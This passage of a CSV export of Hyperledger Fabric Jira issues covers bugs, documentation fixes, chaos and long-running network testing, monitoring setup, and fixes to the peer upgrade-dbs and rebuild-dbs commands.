External builder fails to copy symlinks from build output into persistent directory,FAB-17844,45005,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,sstone1,sstone1,sstone1,06/May/20 9:45 PM,21/May/20 1:20 AM,28/Oct/23 3:10 AM,21/May/20 1:18 AM,v2.1.0,,,,,,,,,v2.2.0,,,,fabric-peer,,,,,,,,,0,ipm,,,,,"External builders may write symlinks to the build output directory - for example, an external builder for Node.js chaincode will likely write out symlinks as part of the node_modules tree.

The code in [https://github.com/hyperledger/fabric/blob/392ecda11773cbb616f6c962742c28a71515f80b/core/container/externalbuilder/copy.go#L81] attempts to do a rename when it wants to move the build output from an external builder to the persistent directory, but if this fails (you cannot rename across volumes), then it attempts to do a copy.

However, the copy doesn't check for symlinks, and just copies them as files instead. This can cause failures at runtime - for example, the node_modules/.bin folder should contain symlinks to any Node.js programs, but if these aren't copied as symlinks then those programs fail to execute.",,caod,sstone1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i00n2e:8zs0i",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),caod,sstone1,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,release-2.1,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"20/May/20 8:10 AM;sstone1;master: [https://github.com/hyperledger/fabric/pull/1233]

release-2.1: [https://github.com/hyperledger/fabric/pull/1295];;;","21/May/20 1:20 AM;caod;does this need to be ported to 2.0 as well?;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Sample scripts for external chaincode should be replaced with /bin/sh based ones,FAB-17846,45008,,Documentation,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,tatsu-sato,tatsu-sato,tatsu-sato,07/May/20 4:39 AM,13/May/20 11:29 PM,28/Oct/23 3:10 AM,13/May/20 11:29 PM,v2.0.1,v2.1.0,,,,,,,,,,,,fabric-docs,,,,,,,,,0,,,,,,"Sample scripts for external chaincode builder and launcher in docs should be replaced */bin/bash* based ones with */bin/sh* based ones for the following reasons:
 * Peer images use Alpine Linux, which does not contain bash.
 * Scripts with bash shebang are not executed in the peers but it is not easy to detect it from the peer logs.

Target docs:
 * docs/source/cc_launcher.md
 * docs/source/cc_service.md",,pandrejko,sykesm,tatsu-sato,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01bpn:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),pandrejko,sykesm,tatsu-sato,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"08/May/20 2:36 AM;sykesm;The peer images do not include, bash, jq, or go yet all three are part of the sample scripts. These scripts are used within the documentation to describe how the scripts function and are based on the scripts we use in integration tests. These are not assets that are expected to be used in the context of any docker image.;;;","12/May/20 7:59 AM;pandrejko;https://github.com/hyperledger/fabric/pull/1222;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Some messages in test-network are wrong,FAB-17847,45010,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,tatsu-sato,tatsu-sato,tatsu-sato,07/May/20 4:43 AM,08/May/20 5:42 AM,28/Oct/23 3:10 AM,08/May/20 5:41 AM,v2.0.1,v2.1.0,,,,,,,,,,,,fabric-samples,,,,,,,,,0,,,,,,"The following messages in *test-network* are wrong:
 * In *checkCommitReadiness()* in *deployCC.sh*
 ** {code:bash}echo ""Attempting to check the commit readiness of the chaincode definition on peer0.org${ORG} secs"" {code}
 *** Lack of information about secs

 * In *chaincodeQuery()* in *deployCC.sh*
 ** {code:bash}echo ""Attempting to Query peer0.org${ORG} ...$(($(date +%s) - starttime)) secs"" {code}
 *** *starttime* is undefined

 

They should be fixed like {code:bash}'Attempting to XXX, Retry after $DELAY seconds.'{code} like other similar functions.",,lehors,tatsu-sato,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01bq3:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),lehors,tatsu-sato,,,,,,,,,,,,,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/protobufjs-6.11.4,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/tough-cookie-4.1.3,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/semver-6.3.1,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/grpc/grpc-js-1.8.17,dependabot/go_modules/high-throughput/application-go/google.golang.org/grpc-1.53.0,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/word-wrap-1.2.4,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/protobufjs-and-fabric-network-7.2.4,dependabot/go_modules/asset-transfer-basic/application-go/google.golang.org/grpc-1.53.0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"08/May/20 5:42 AM;lehors;https://github.com/hyperledger/fabric-samples/pull/181;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Add a sample of external chaincode in test-network,FAB-17848,45011,,Task,Backlog,FAB,Fabric,software,denyeart,,,Medium,,tatsu-sato,tatsu-sato,tatsu-sato,07/May/20 4:45 AM,14/May/20 7:17 AM,28/Oct/23 3:10 AM,,v2.0.1,v2.1.0,,,,,,,,,,,,fabric-samples,,,,,,,,,0,,,,,,"*fabric-samples* has a fabcar sample as an external chaincode in *chaincode/fabcar/external*.

This sample is useful for understanding the external chaincode.

 

However, it may be not easy for Fabric beginners to run the sample with the right settings by only reading the documentation and the instructions in this sample.

I think that the reasons are as follows:
 - There are not end-to-end instructions (or tutorials)

 - *fabric-samples* does not provide scripts to run the sample directly

 

Therefore, we propose to add an option to use the above sample to *test-network* to easily try external chaincode features.",,sykesm,tatsu-sato,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01bqb:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),sykesm,tatsu-sato,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"08/May/20 2:34 AM;sykesm;Before this work is done, I believe we should ensure that the PR which adds an integration test for external chaincode gets merged into Fabric. It appears that the original of the feature and the author of the PR may have lost interest in completing that task.

https://github.com/hyperledger/fabric/pull/552;;;","14/May/20 7:17 AM;tatsu-sato;[~sykesm] 
Thank you for your information.
I see. I would like to wait for this patch to be merged.
 ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
List a single channel REST API,FAB-17849,45013,40568,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Duplicate,tock,tock,tock,07/May/20 3:40 PM,11/May/20 4:21 PM,28/Oct/23 3:10 AM,11/May/20 4:21 PM,,,,,,,,,,,,,,fabric-orderer,,,,,,,,,0,,,,,,,,tock,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01bqr:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),tock,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"Test all aspects of the Fabric system for functionality, scalability, stability, and fault tolerance",FAB-17850,45015,,Epic,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,,btl5037,btl5037,08/May/20 1:38 PM,11/Jan/21 3:20 AM,28/Oct/23 3:10 AM,11/Jan/21 3:20 AM,,,,,,,,,,,,,,fabric-quality,,,,,,,,,0,,,,,,,,btl5037,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,ghx-label-1,,System Test,To Do,No,,Unset,No,,,"1|i01br7:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),btl5037,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Chaos Testing,FAB-17851,45016,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Invalid,suryalnvs,btl5037,btl5037,08/May/20 1:41 PM,11/Jan/21 3:20 AM,28/Oct/23 3:10 AM,11/Jan/21 3:20 AM,,,,,,,,,,,,,,fabric-quality,,,,,,,,,0,,,,,,"Some of the fundamental properties of a Blockchain network, are its highly-availability, fault-tolerance and ability to recover from disaster. To that end, one of chief goal as System Test should be to fully test the ability of a Fabric network to recover from minimal and total failure. Our goal should be to assert the expected functionality of the network as we kill off components and allow them to come recover, delete the underlying artifacts of these components, and take them offline for extended periods of time.

This testing will be performed using ChaosKube on a Kubernetes cluster.",,btl5037,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-17850,,,No,,Unset,No,,,"1|i00uze:rzczqzxyzzx8zwb",,,,Unset,Unset,In Progress,(Please add steps to reproduce),,Yes,,,,,,Unset,,Unset,,(Please add usage information),btl5037,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Production Network Testing,FAB-17852,45018,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Invalid,suryalnvs,btl5037,btl5037,08/May/20 1:49 PM,11/Jan/21 3:18 AM,28/Oct/23 3:10 AM,11/Jan/21 3:18 AM,,,,,,,,,,,,,,fabric-quality,,,,,,,,,0,,,,,,"A blockchain is meant to be a pseudo-immutable, everlasting ledger. It is meant to run forever, without ever coming offline, and never experiencing downtime.

To that end, as System Test, we will test a network by running in a manner consistent with the expectations we have of our consumers running their networks in production. This include monitoring, alerting, scaling, upgrading, trafficking, and maintaining the network just as our consumers do. We will encounter the same issues our consumers experience, such as storage size, and deal with them in the same manner our consumers do.

The intent is that this network should never stop running. By doing this, we will be able to better understand the UX of our consumers and help drive out technical challenges they face, all while asserting that our software behaves in a manner consistent with its intended design.

Outputs of this work will include documentation for features, maintenance, etc., as well writing user stories from our experience to drive new work in Fabric UX.",,btl5037,suryalnvs,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-17850,,,No,,Unset,No,,,"1|i00uze:rzczqzxyzzx8zwz1",,,,Unset,Unset,In Progress,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),btl5037,suryalnvs,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"27/Jun/20 12:24 AM;suryalnvs;Network is deployed to community-longrun cluster, scheduled a daily run to send invokes to production network and it is running at https://dev.azure.com/Hyperledger/Fabric-Test/_build?definitionId=108&_a=summary;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Install and Instantiate Chaincode,FAB-17853,45019,45016,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Invalid,,btl5037,btl5037,08/May/20 1:57 PM,12/May/20 3:39 AM,28/Oct/23 3:10 AM,12/May/20 3:39 AM,,,,,,,,,,,,,,fabric-quality,,,,,,,,,0,,,,,,"We should install and instantiate a simple Go chaincode on the Chaos network such as samplecc. This chaincode will serve no purpose other than to drive traffic, so it need not be anything fancy.",,btl5037,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01bs3:",,,,Unset,Unset,In Progress,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),btl5037,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Enhance Kubernetes Operator to Include Org Name in Component Label,FAB-17854,45020,45016,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Invalid,,btl5037,btl5037,08/May/20 2:07 PM,12/May/20 3:32 AM,28/Oct/23 3:10 AM,12/May/20 3:32 AM,,,,,,,,,,,,,,fabric-quality,,,,,,,,,0,,,,,,"To achieve more granular control of the components being targeted during chaos testing we should also add the org name to the components label, so the peer label becomes `org1-peer`.

This will allow us to run parallel pipelines targeting the peers of both orgs at the same time.",,btl5037,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01bsb:",,,,Unset,Unset,In Progress,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),btl5037,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Introduce Chaos Into Peer Pods,FAB-17855,45021,45016,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Invalid,suryalnvs,btl5037,btl5037,08/May/20 2:12 PM,11/Jan/21 3:20 AM,28/Oct/23 3:10 AM,11/Jan/21 3:20 AM,,,,,,,,,,,,,,fabric-quality,,,,,,,,,0,,,,,,"This test should randomly target the the peers of all orgs, using the labels of the peer components. The command should generate two helm deployments of ChaosKube, one that targets the peers of org1 and one that targets the peers of org 2. There should be a 30 minute interval in-between the successive removal of the pods.",,btl5037,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01bsj:",,,,Unset,Unset,In Progress,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),btl5037,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Introduce Chaos Into Orderer Pods,FAB-17856,45022,45016,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Invalid,,btl5037,btl5037,08/May/20 2:13 PM,11/Jan/21 3:20 AM,28/Oct/23 3:10 AM,11/Jan/21 3:20 AM,,,,,,,,,,,,,,fabric-quality,,,,,,,,,0,,,,,,"This test should randomly target the the orderers of all orgs, using the labels of the orderer components. The command should generate two helm deployments of ChaosKube, one that targets the orderers of org1 and one that targets the orderers of org 2. There should be a 30 minute interval in-between the successive removal of the pods.",,btl5037,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01bsr:",,,,Unset,Unset,In Progress,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),btl5037,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Introduce Chaos Into CouchDB Pods,FAB-17857,45023,45016,Sub-task,To Do,FAB,Fabric,software,denyeart,,,Medium,,,btl5037,btl5037,08/May/20 2:13 PM,10/Jun/20 11:15 AM,28/Oct/23 3:10 AM,,,,,,,,,,,,,,,,,,,,,,,,0,,,,,,"This test should randomly target CouchDB of all orgs, using the labels of the CouchDB components. The command should generate two helm deployments of ChaosKube, one that targets CouchDB of org1 and one that targets CouchDB of org 2. There should be a 30 minute interval in-between the successive removal of the pods.

These pods should be deployed with absolute minimal resources, to attempt to introduce a fork",,btl5037,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01bsz:",,,,Unset,Unset,In Progress,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),btl5037,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"Enhance Operator to Allow the Addition of Orgs, Peers, and Orderers",FAB-17858,45024,45018,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,,btl5037,btl5037,08/May/20 4:36 PM,11/Jan/21 1:35 AM,28/Oct/23 3:10 AM,11/Jan/21 1:35 AM,,,,,,,,,,,,,,fabric-quality,,,,,,,,,0,,,,,,"In order to expand the network to new participants, we need to add a feature to the operator to add new orgs, or to add new peers and orderers to existing orgs.

Perhaps we can add an `extend` function of the operator that ingests a new file and adds them to the existing network.

We need to take into consideration that the existing connections profile needs to be present and we need to append the new orgs/components to the existing profile.

Acceptance Criteria:",,btl5037,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01btk:",,,,Unset,Unset,In Progress,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),btl5037,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Configure Granafa to Display Key Metrics,FAB-17859,45025,45018,Sub-task,In Progress,FAB,Fabric,software,denyeart,,,Medium,,suryalnvs,btl5037,btl5037,08/May/20 4:38 PM,12/May/20 3:09 AM,28/Oct/23 3:10 AM,,,,,,,,,,,,,,,,,,,,,,,,0,,,,,,"For the long running network we have a prometheus server running in the cluster. We need to add key metrics to Grafana that we can use to get a birds-eye view of the network at any time.

Key metrics are:
 * A
 * B
 * C

Acceptance Criteria: A user is able to login to Grafana and get an overview of the network status from the dashboard",,btl5037,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01btf:",,,,Unset,Unset,In Progress,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),btl5037,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Configure Resource Monitoring For SysDig,FAB-17860,45026,45018,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,,btl5037,btl5037,08/May/20 4:40 PM,11/Jan/21 1:35 AM,28/Oct/23 3:10 AM,11/Jan/21 1:35 AM,,,,,,,,,,,,,,fabric-quality,,,,,,,,,0,,,,,,"We have the Sysdig service running in the cluster. We need to decide on what resource exhaustion limits for cpu's, disk and memory and then create alerts in Sysdig for these limits.

The limits are:
 * CPU Utilization – 80% for 4 minutes
 * Memory Utilization – 80% for 4 minutes
 * Disk Utilization – 80% for 4 minutes

When an alert is issued is should be posted to our Slack channel via webhook.

Acceptance Criteria:",,btl5037,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01btn:",,,,Unset,Unset,In Progress,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),btl5037,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Configure Log Alerting LogDNA,FAB-17861,45027,45018,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,,btl5037,btl5037,08/May/20 4:49 PM,11/Jan/21 1:35 AM,28/Oct/23 3:10 AM,11/Jan/21 1:35 AM,,,,,,,,,,,,,,fabric-quality,,,,,,,,,0,,,,,,"The cluster has the LogDNA service running in it. We need to configure LogDNA to send us alerts when error messages start appearing in the log.

Initially we should create a set of views for each component and alert to email (we can use mine for now) when the same error occurs <N> times in a row in <N> seconds.

Default to 3 times in 30 seconds. We can adjust as necessary.

When an error alert is triggered it should send the alert to us via webhook.

Acceptance Criteria:",,btl5037,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01btv:",,,,Unset,Unset,In Progress,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),btl5037,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Allow upgrade-dbs to drop all dbs when running second times,FAB-17862,45028,44914,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,wenjian,denyeart,denyeart,08/May/20 9:08 PM,14/May/20 12:01 AM,28/Oct/23 3:10 AM,14/May/20 12:01 AM,v2.2.0,,,,,,,,,v2.2.0,,,,fabric-ledger,,,,,,,,,0,ipm2,,,,,"After upgrading to v2.0 with CouchDB, you can upgrade-dbs as follows:
{code:java}
peer node upgrade-dbs
{code}
 

This will drop/upgrade local peer databases to v2.0. If CouchDB was down, or you forgot to pass the CouchDB variable CORE_LEDGER_STATE_STATEDATABASE, it will not drop the CouchDB databases as part of upgrade-dbs.

Starting peer next time will therefore give an error:
 
{code:java}
2020-05-08 07:58:08.814 EDT [kvledger] func1 -> ERRO 048 Please execute the 'peer node upgrade-dbs' command to upgrade the database format: unexpected format. db info = [CouchDB for state database], data format = [], expected format = [2.0] panic: Error in instantiating ledger provider: unexpected format. db info = [CouchDB for state database], data format = [], expected format = [2.0]{code}
 
 

The error says to run upgrade-dbs again since CouchDB database is still in old format.

If you run upgrade-dbs again, this time passing CouchDB as state database, you will get a message that saying upgrade-dbs has nothing to do:
 
{code:java}
CORE_LEDGER_STATE_STATEDATABASE=CouchDB peer node upgrade-dbs 2020-05-08 07:59:09.077 EDT [kvledger] UpgradeDBs -> INFO 001 Ledger data folder from config = [/var/hyperledger/production/ledgersData] 2020-05-08 07:59:09.116 EDT [kvledger] checkUpgradeEligibility -> INFO 002 Ledger data format is current, nothing to upgrade.{code}
 
 

It should be possible to run upgrade-dbs multiple times, so that any databases missed the first time, can be dropped/upgraded the second time.",,denyeart,wenjian,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i00wur:0idk",,,,Unset,Unset,v2.x,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),denyeart,wenjian,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"12/May/20 5:29 AM;wenjian;PR: [https://github.com/hyperledger/fabric/pull/1236];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
rebuild-dbs should be able to drop CouchDB state database,FAB-17863,45029,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,wenjian,denyeart,denyeart,08/May/20 9:12 PM,12/May/20 5:29 AM,28/Oct/23 3:10 AM,12/May/20 5:29 AM,,,,,,,,,,v2.2.0,,,,fabric-ledger,,,,,,,,,0,,,,,,"Recently upgrade-dbs added support for remote CouchDB database.

rebuild-dbs should similarly support dropping CouchDB databases.

 

As an administrator, I want to drop my peer databases including CouchDB state databases, so that the next time peer restarts it will rebuild my databases.

 

Acceptance: rebuild-dbs should drop databases including CouchDB state databases. The next peer start should rebuild databases including CouchDB state databases using the channel blockchains.",,denyeart,wenjian,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i00wur:0idq",,,,Unset,Unset,v2.x,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),denyeart,wenjian,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"12/May/20 1:47 AM;wenjian;PR: [https://github.com/hyperledger/fabric/pull/1235];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
upgrade-dbs command should fail if CouchDB state database cannot be dropped,FAB-17864,45030,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,wenjian,denyeart,denyeart,08/May/20 9:29 PM,12/May/20 2:44 AM,28/Oct/23 3:10 AM,12/May/20 2:44 AM,,,,,,,,,,v2.2.0,,,,fabric-ledger,,,,,,,,,0,ipm2,,,,,"If `peer node upgrade-dbs` cannot connect to CouchDB to upgrade (drop) the CouchdB state databases, then retries will be exhausted, CouchDB databases will not be dropped, but the other peer databases will be dropped:

 
{code:java}
$ CORE_LEDGER_STATE_STATEDATABASE=CouchDB peer node upgrade-dbs
2020-05-08 08:21:41.898 EDT [kvledger] UpgradeDBs -> INFO 001 Ledger data folder from config = [/var/hyperledger/production/ledgersData]
2020-05-08 08:21:41.949 EDT [statecouchdb] DropApplicationDBs -> INFO 002 Dropping CouchDB application databases ...
